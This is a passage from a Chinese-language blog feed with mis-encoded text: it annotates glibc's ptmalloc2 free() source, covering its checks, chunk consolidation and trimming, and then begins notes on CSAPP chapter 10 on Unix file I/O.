class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span><br>   <span class="hljs-comment">// åˆ¤æ–­ next chunk æ˜¯å¦è¶…è¿‡åˆ†é…åŒº</span><br>   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br>   <span class="hljs-comment">/* Or whether the block is actually not marked used.  */</span><br>   <span class="hljs-comment">// æ£€æŸ¥ next chunk çš„ inuse ä½ï¼Œåˆ¤æ–­è¢«é‡Šæ”¾çš„ chunk æ˜¯å¦åœ¨ä½¿ç”¨ </span><br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   <span class="hljs-comment">// åˆ¤æ–­ next chunk çš„ size æ˜¯å¦åˆæ³•</span><br>   nextsize = chunksize(nextchunk);<br>   <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>     &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>     &#125;<br><br>   <span class="hljs-comment">// æ¸…é™¤è¦è¢«é‡Šæ”¾çš„ chunk çš„å†…å®¹</span><br>   free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„éƒ¨åˆ†å°±æ˜¯å¯¹å †å—çš„å„ç§æ£€æŸ¥ï¼Œä¿è¯ free è¿™ä¸ªå †å—ä¸ä¼šå‘ç”Ÿé”™è¯¯ã€‚å…¶ä¸­ <code>nextchunk-&gt;size &lt;= 2 * SIZE_SZ</code>çš„æ£€æŸ¥ï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¸‹ä¸€ä¸ª chunk çš„ <code>size</code> å°äº <code>MINSIZE</code> ä¹Ÿä¼šæŠ¥é”™ï¼Œ å› ä¸ºä¼šæ¶‰åŠåˆ° chunk çš„å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ï¼Œå› æ­¤éœ€è¦å¯¹å‰åå †å—éƒ½è¿›è¡Œæ£€æŸ¥ã€‚</p><p>ä¸‹é¢å°±æ˜¯å‘å‰å’Œå‘ååˆå¹¶å †å—å¤§å°çš„æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-comment">/* consolidate backward */</span><br>   <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª prev chunk ä¹Ÿå¤„äºé‡Šæ”¾çŠ¶æ€ï¼Œåˆ™ç”¨ unlink åˆå¹¶ä¸¤ä¸ª chunk</span><br>   <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>     prevsize = p-&gt;prev_size;<br>     size += prevsize;<br>     p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>     unlink(av, p, bck, fwd);<br>   &#125;<br><br>   <span class="hljs-comment">// å¦‚æœ next chunk ä¸æ˜¯ top chunk</span><br>   <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>     <span class="hljs-comment">/* get and clear inuse bit */</span><br>     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>     <span class="hljs-comment">/* consolidate forward */</span><br>     <span class="hljs-comment">// å¦‚æœ next chunk ä¹Ÿå¤„äºé‡Šæ”¾ä¸­ï¼Œåˆ™ç»§ç»­å‘ä¸‹åˆå¹¶ next chunk</span><br>     <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink(av, nextchunk, bck, fwd);<br>size += nextsize;<br>     &#125; <span class="hljs-keyword">else</span><br>   <span class="hljs-comment">// æ¸…é™¤ inuse ä½</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br>     <span class="hljs-comment">// è·å–å½“å‰ unsortedbin çš„æœ«å°¾ chunk å’Œé“¾è¡¨å¤´ chunk</span><br>     bck = unsorted_chunks(av);<br>     fwd = bck-&gt;fd;<br>     <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>&#123;<br>  errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>  <span class="hljs-keyword">goto</span> errout;<br>&#125;<br>     <span class="hljs-comment">// å°†å½“å‰ chunk æ’å…¥ unsortedbin ä¸­</span><br>     p-&gt;fd = fwd;<br>     p-&gt;bk = bck;<br>     <span class="hljs-comment">// å¦‚æœ size ä¸å±äº small binï¼Œéœ€è¦è®¾ç½® large bin</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>&#125;<br>     <span class="hljs-comment">// æ›´æ–°é“¾è¡¨å¤´å°¾æŒ‡é’ˆ</span><br>     bck-&gt;fd = p;<br>     fwd-&gt;bk = p;<br><br>     <span class="hljs-comment">// è®¾ç½® chunk çš„å¤´éƒ¨å’Œå°¾éƒ¨ prev_size</span><br>     set_head(p, size | PREV_INUSE);<br>     set_foot(p, size);<br><br>     check_free_chunk(av, p);<br>   &#125;<br><br>   <span class="hljs-comment">// å¦‚æœå½“å‰ chunk ä¸´è¿‘ top chunkï¼Œåˆ™ç›´æ¥åˆå¹¶åˆ° top chunk</span><br>   <span class="hljs-keyword">else</span> &#123;<br>     size += nextsize;<br>     set_head(p, size | PREV_INUSE);<br>     av-&gt;top = p;<br>     check_chunk(av, p);<br>   &#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å°±æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µï¼Œå°±æ˜¯æˆ‘ä»¬å¦‚æœä¸€ä¸‹å­å›æ”¶ä¸€ä¸ª <code>0x10000B</code> è¿™ä¹ˆå¤§çš„ç©ºé—´ï¼Œä¼šå›æ”¶ç»™ç³»ç»Ÿï¼Œè¿™æ ·å¯ä»¥å‡å°‘èµ„æºå ç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">// å¦‚æœå‰é¢é‡Šæ”¾çš„ chunk å¤§å°è¾ƒå¤§ï¼Œå°† fast bin åˆå¹¶åˆ° unsortedbin ä¸­</span><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>malloc_consolidate(av);<br><br>      <span class="hljs-comment">// å¦‚æœè¿›ç¨‹çš„åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒºï¼Œè°ƒç”¨ systrim æ”¶ç¼©å†…å­˜ï¼Œå¦åˆ™è·å–éä¸»åˆ†é…åŒºçš„ heap_infoï¼Œç”¨ heap_trim æ”¶ç¼© heap</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;=<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>  systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">   large, because the corresponding heap might go away.  */</span><br>heap_info *heap = heap_for_ptr(top(av));<br><br>assert(heap-&gt;ar_ptr == av);<br>heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>å…ˆè°ƒç”¨ <code>malloc_consolidate</code> åˆå¹¶æ‰€æœ‰ <code>fast bin</code> ã€‚å¦‚æœè¿›ç¨‹æ‰€åœ¨çš„åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒºå¹¶ä¸”å¯ä»¥æ”¶ç¼©å†…å­˜çš„è¯ï¼Œå°±è°ƒç”¨ <code>systrim</code> æ”¶ç¼©å†…å­˜ï¼Œå¦åˆ™å°±è·å¾—éä¸»åˆ†é…åŒºçš„ <code>heap_info</code> æŒ‡é’ˆï¼Œè°ƒç”¨ <code>heap_trim</code> æ”¶ç¼© <code>heap</code> ã€‚</p><h5 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p><code>free</code>ä¸åƒ <code>malloc</code> é‚£ä¹ˆå¤æ‚ï¼Œå¤§è‡´ä¸Šå°±æ˜¯å±äº <code>fast bin</code> çš„ç›´æ¥åŠ å…¥å¯¹åº”é“¾è¡¨ï¼Œä¸å±äº <code>fast bin</code> çš„å‘å‰åˆå¹¶æˆ–è€…å‘ååˆå¹¶ç„¶ååŠ å…¥ <code>unsorted bin </code> ã€‚å¦‚æœä¸€æ¬¡<code>free</code>å¤ªå¤šçš„ç©ºé—´æœ‰å¯èƒ½ä¼šè¢«æ“ä½œç³»ç»Ÿå›æ”¶ã€‚</p><hr><p>è¿™é‡Œæœ‰å¯¹ ptmalloc2 çš„ç›¸å…³ä»£ç çš„åˆ†æï¼š<a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">Glibcå†…å­˜ç®¡ç† (seebug.org)</a></p><p>è¿™ä¸ªå‰åŠéƒ¨åˆ†çš„ç†è®ºè®²çš„æ¯”è¾ƒç»†ï¼Œæºç åˆ†æéƒ¨åˆ†å°±æ¯”è¾ƒç²—ç•¥äº†</p><p>ç¢ç¢å¿µï¼š</p><p>è®¡ç®—æœºå‘æ˜è€…å’Œè®¡ç®—æœºå„ç§è¯­è¨€å„ç§åº“çš„å‘æ˜è€…å¥½ç‰›ï¼Œä»–ä»¬çš„è„‘å­å’Œæˆ‘çš„å¥½åƒæ˜¯ä¸å¤ªä¸€æ ·çš„ğŸ¥¹</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>libc</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬åç«  ç³»ç»Ÿçº§IO</title>
    <link href="/2023/12/08/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/"/>
    <url>/2023/12/08/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/</url>
    
    <content type="html"><![CDATA[<p>I&#x2F;O ä¸åªç®€å•çš„è¾“å…¥&#x2F;è¾“å‡º</p><span id="more"></span><p>è¾“å…¥&#x2F;è¾“å‡ºï¼ˆI&#x2F;Oï¼‰æ˜¯åœ¨ä¸»å­˜å’Œå¤–éƒ¨è®¾å¤‡ï¼ˆä¾‹å¦‚ç£ç›˜é©±åŠ¨å™¨ã€ç»ˆç«¯å’Œç½‘ç»œï¼‰ä¹‹é—´å¤åˆ¶æ•°æ®çš„è¿‡ç¨‹ã€‚è¾“å…¥æ“ä½œæ˜¯ä» I&#x2F;O è®¾å¤‡å¤åˆ¶æ•°æ®åˆ°ä¸»å­˜ï¼Œè€Œè¾“å‡ºæ“ä½œæ˜¯ä»ä¸»å­˜å¤åˆ¶æ•°æ®åˆ° I&#x2F;O è®¾å¤‡ã€‚</p><p>æ‰€æœ‰è¯­è¨€çš„è¿è¡Œæ—¶ç³»ç»Ÿéƒ½æä¾›æ‰§è¡Œ I&#x2F;O çš„è¾ƒé«˜çº§åˆ«çš„å·¥å…·ã€‚ä¾‹å¦‚Cè¯­è¨€çš„ scanf å’Œ printfï¼ŒC++ çš„ cin å’Œ cout ã€‚</p><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæ˜¯é€šè¿‡ä½¿ç”¨ç”±å†…æ ¸æä¾›çš„ç³»ç»Ÿçº§ Unix I&#x2F;O å‡½æ•°æ¥å®ç°è¿™äº›è¾ƒé«˜çº§åˆ«çš„ I&#x2F;O å‡½æ•°çš„ã€‚</p><h1 id="Unix-I-x2F-O"><a href="#Unix-I-x2F-O" class="headerlink" title="Unix I&#x2F;O"></a>Unix I&#x2F;O</h1><p>æˆ‘ä»¬çŸ¥é“åœ¨ Linux å½“ä¸­ï¼Œä¸€åˆ‡çš†æ–‡ä»¶ã€‚æ‰€æœ‰çš„ IO è®¾å¤‡ä¹Ÿéƒ½è¢«æ¨¡å‹åŒ–ä¸ºæ–‡ä»¶ã€‚è¾“å…¥è¾“å‡ºéƒ½è¢«å½“ä½œç®€å•çš„è¯»å†™æ–‡ä»¶ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ‰€æœ‰çš„è¾“å…¥å’Œè¾“å‡ºéƒ½å¯ä»¥ç®€å•ä¸€è‡´çš„æ–¹å¼å»è®¿é—®ï¼š</p><ul><li>æ‰“å¼€æ–‡ä»¶ï¼šé€šè¿‡ open å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…æ ¸ä¼šè®°å½•æœ‰å…³è¿™ä¸ªæ‰“å¼€æ–‡ä»¶çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¹¶å‘ç”¨æˆ·å±‚ä¼šè¿”å›ä¸€ä¸ª<strong>æ–‡ä»¶æè¿°ç¬¦</strong>ï¼Œç”¨æˆ·å±‚è¦æ“ä½œæ–‡ä»¶åªéœ€è¦å¯¹æ–‡ä»¶æè¿°ç¬¦æ“ä½œå³å¯ã€‚</li><li>Linux shell åœ¨åˆ›å»ºè¿›ç¨‹çš„æ—¶å€™æœ‰é»˜è®¤çš„ä¸‰ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼šæ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ï¼Œæ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰ï¼Œä»–ä»¬çš„æè¿°ç¬¦åˆ†åˆ«ä¸º0ï¼Œ1ï¼Œ2ã€‚</li><li>æ”¹å˜å½“å‰æ–‡ä»¶çš„ä½ç½®ï¼šå¯¹äºæ¯ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼Œå†…æ ¸ä¼šè®°å½•æ–‡ä»¶æ‰€åœ¨çš„ä½ç½® kï¼Œåˆå§‹ä¸º 0ã€‚åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ seek æ“ä½œï¼Œæ˜¾ç¤ºçš„æ”¹å˜è¿™ä¸ªå€¼ã€‚</li><li>è¯»å†™æ–‡ä»¶ï¼šè¯»æ–‡ä»¶å°±æ˜¯æŠŠæ–‡ä»¶ä¸­ä» k å¼€å§‹åˆ° k+size çš„æ–‡ä»¶å†…å®¹å¤åˆ¶åˆ°å†…å­˜ï¼Œå†™æ–‡ä»¶å°±æ˜¯æŠŠæ–‡ä»¶ä¸­ä» k å¼€å§‹åˆ° k + size çš„æ–‡ä»¶å†…å®¹ç”¨å†…å­˜ä¸­çš„æŸäº›å€¼æ›¿æ¢ã€‚</li><li>å…³é—­æ–‡ä»¶ï¼šå®Œæˆäº†è®¿é—®ä¹‹åï¼Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ close å‡½æ•°å»é€šçŸ¥å†…æ ¸å…³é—­è¿™ä¸ªæ–‡ä»¶ï¼Œé‡Šæ”¾ç³»ç»Ÿèµ„æºã€‚</li></ul><h1 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h1><p>æ¯ä¸ªLinuxæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªç±»å‹æ¥è¡¨æ˜å®ƒåœ¨ç³»ç»Ÿä¸­çš„è§’è‰²ï¼š</p><ul><li>æ™®é€šæ–‡ä»¶ï¼ˆregular fileï¼‰ï¼šåŒ…å«ä»»æ„æ•°æ®ã€‚åº”ç”¨ç¨‹åºå¸¸å¸¸è¦åŒºåˆ†æ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œå¯¹å†…æ ¸è€Œè¨€ï¼Œæ–‡æœ¬æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰åŒºåˆ«ã€‚</li><li>ç›®å½•ï¼ˆdirectoryï¼‰ï¼šæ˜¯åŒ…å«ä¸€ç»„é“¾æ¥çš„æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªé“¾æ¥éƒ½å°†ä¸€ä¸ªæ–‡ä»¶åæ˜ å°„åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½æ˜¯å¦ä¸€ä¸ªç›®å½•ã€‚æ¯ä¸ªç›®å½•è‡³å°‘åŒ…å«ä¸¤ä¸ªæ¡ç›®ï¼š<code>.</code> æ˜¯åˆ°è¯¥ç›®å½•è‡ªèº«çš„é“¾æ¥ï¼›ä»¥åŠ <code>..</code> æ˜¯åˆ°ç›®å½•å±‚æ¬¡ç»“æ„ä¸­çˆ¶ç›®å½•çš„é“¾æ¥ã€‚</li><li>å¥—æ¥å­—ï¼ˆsocketï¼‰ï¼šæ˜¯ç”¨æ¥ä¸å¦ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œè·¨ç½‘ç»œé€šä¿¡çš„æ–‡ä»¶</li></ul><p>Linux å†…æ ¸è®²æ‰€æœ‰æ–‡ä»¶éƒ½ç»„ç»‡æˆä¸€ä¸ªç›®å½•å±‚æ¬¡ç»“æ„ï¼Œç”±åä¸º <code>/</code> çš„æ ¹ç›®å½•ç¡®å®šã€‚ç³»ç»Ÿä¸­æ¯ä¸€ä¸ªæ–‡ä»¶éƒ½æ˜¯æ ¹ç›®å½•çš„åä»£ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-Linux%E7%9B%AE%E5%BD%95%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png"></p><p>æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæœ‰ä¸€ä¸ª<strong>å½“å‰å·¥ä½œç›®å½•</strong>ï¼ˆcurrent working directoryï¼‰æ¥ç¡®å®šå…¶åœ¨ç›®å½•å±‚æ¬¡ç»“æ„ä¸­çš„å½“å‰ä½ç½®ã€‚å¯ä»¥ç”¨ cd å‘½ä»¤æ¥ä¿®æ”¹ shell ä¸­çš„å½“å‰å·¥ä½œç›®å½•ã€‚</p><p>ç›®å½•å±‚æ¬¡ç»“æ„ä¸­çš„ä½ç½®ç”¨<strong>è·¯å¾„å</strong>ï¼ˆpathnameï¼‰æ¥æŒ‡å®šã€‚è·¯å¾„åæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬ä¸€ä¸ªå¯é€‰æ–œæ ï¼Œå…¶åç´§è·Ÿä¸€ç³»åˆ—çš„æ–‡ä»¶åï¼Œæ–‡ä»¶åä¹‹é—´ç”¨æ–œæ åˆ†éš”ã€‚è·¯å¾„åæœ‰ä¸¤ç§å½¢å¼ï¼š</p><ul><li><strong>ç»å¯¹è·¯å¾„å</strong>ï¼ˆabsolute pathnameï¼‰ä»¥ä¸€ä¸ªæ–œæ å¼€å§‹ï¼Œè¡¨ç¤ºä»æ ¹èŠ‚ç‚¹å¼€å§‹çš„è·¯å¾„ã€‚ä¾‹å¦‚ä¸Šå›¾ä¸­ hello.c çš„ç»å¯¹è·¯å¾„åä¸º <strong>&#x2F;home&#x2F;droh&#x2F;hello.c</strong>ã€‚</li><li><strong>ç›¸å¯¹è·¯å¾„å</strong>ï¼ˆrelative pathnameï¼‰ä»¥æ–‡ä»¶åå¼€å§‹ï¼Œè¡¨ç¤ºä»å½“å‰å·¥ä½œç›®å½•å¼€å§‹çš„è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <strong>&#x2F;home&#x2F;droh</strong> æ˜¯å½“å‰å·¥ä½œç›®å½•ï¼Œé‚£ä¹ˆ <strong>hello.c</strong> çš„ç›¸å¯¹è·¯å¾„åå°±æ˜¯ <strong>.&#x2F;hello.c</strong>ã€‚åä¹‹ï¼Œå¦‚æœ <strong>&#x2F;home&#x2F;bryant</strong> æ˜¯å½“å‰å·¥ä½œç›®å½•ï¼Œé‚£ä¹ˆç›¸å¯¹è·¯å¾„åå°±æ˜¯ <strong>..&#x2F;home&#x2F;droh&#x2F;hello.c</strong>ã€‚</li></ul><h1 id="æ‰“å¼€å’Œå…³é—­æ–‡ä»¶"><a href="#æ‰“å¼€å’Œå…³é—­æ–‡ä»¶" class="headerlink" title="æ‰“å¼€å’Œå…³é—­æ–‡ä»¶"></a>æ‰“å¼€å’Œå…³é—­æ–‡ä»¶</h1><p>è¿›ç¨‹é€šè¿‡è°ƒç”¨ open å‡½æ•°æ¥æ‰“å¼€æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, <span class="hljs-type">int</span> flags, <span class="hljs-type">mode_t</span> mode)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºæ–°æ–‡ä»¶æè¿°ç¬¦ï¼Œè‹¥å‡ºé”™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>open å‡½æ•°å°† filename è½¬æ¢ä¸ºä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä¸”è¿”å›æè¿°ç¬¦æ•°å­—ã€‚</p><p>è¿”å›çš„æè¿°ç¬¦æ€»æ˜¯åœ¨è¿›ç¨‹ä¸­<strong>å½“å‰æ²¡æœ‰æ‰“å¼€çš„æœ€å°æè¿°ç¬¦</strong>ã€‚flags å‚æ•°æŒ‡æ˜äº†è¿›ç¨‹æ‰“ç®—å¦‚ä½•è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼š</p><ul><li>O_RDONLYï¼šåªè¯»ã€‚</li><li>O_WRONLYï¼šåªå†™ã€‚</li><li>O_RDWRï¼šå¯è¯»å¯å†™ã€‚</li></ul><p>flags å‚æ•°ä¹Ÿå¯ä»¥æŒ‰ä½æˆ–æ›´å¤šä½æ©ç ï¼Œä¸ºå†™æä¾›ç»™ä¸€äº›é¢å¤–çš„æŒ‡ç¤ºï¼š</p><ul><li>O_CREATï¼šå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå°±åˆ›å»ºå®ƒçš„ä¸€ä¸ª<strong>æˆªæ–­çš„</strong>ï¼ˆtruncatedï¼‰ï¼ˆç©ºï¼‰æ–‡ä»¶ã€‚</li><li>O_TRUNCï¼šå¦‚æœæ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå°±æ¸…ç©ºé‡Œé¢çš„å†…å®¹ã€‚</li><li>O_APPENDï¼šåœ¨æ¯æ¬¡å†™æ“ä½œå‰ï¼Œè®¾ç½®æ–‡ä»¶ä½ç½®åˆ°æ–‡ä»¶çš„ç»“å°¾å¤„ã€‚</li></ul><p>ç¬¬ä¸‰ä¸ªå‚æ•° mode æ˜¯æˆ‘ä»¬åˆ›å»ºæ–‡ä»¶æ—¶çš„æƒé™ï¼Œ Linux çš„æ–‡ä»¶æƒé™æœ‰ 9  ä½äºŒè¿›åˆ¶æ•°å­—ç»„æˆï¼Œå› æ­¤å®ƒä¹Ÿæœ‰å®šä¹‰ä¹ä¸ªå®åˆ†åˆ«è¡¨ç¤ºè¿™äº›æƒé™ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-open-mode%E5%AE%8F.png"></p><p>åœ¨æ“ä½œå®Œæˆåï¼Œä½¿ç”¨ CLOSE å‡½æ•°å…³é—­æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#incllude <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span>;<br><br><span class="hljs-comment">//è¿”å›ï¼Œè‹¥æˆåŠŸåˆ™ä¸º0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º-1</span><br></code></pre></td></tr></table></figure><h1 id="è¯»å’Œå†™æ–‡ä»¶"><a href="#è¯»å’Œå†™æ–‡ä»¶" class="headerlink" title="è¯»å’Œå†™æ–‡ä»¶"></a>è¯»å’Œå†™æ–‡ä»¶</h1><p>ç”¨ç”¨ç¨‹åºä½¿ç”¨ read å‡½æ•°å’Œ write å‡½æ•°æ¥è¯»å†™æ–‡ä»¶ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> n)</span>;<br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºè¯»çš„å­—èŠ‚æ•°ï¼Œè‹¥ EOF 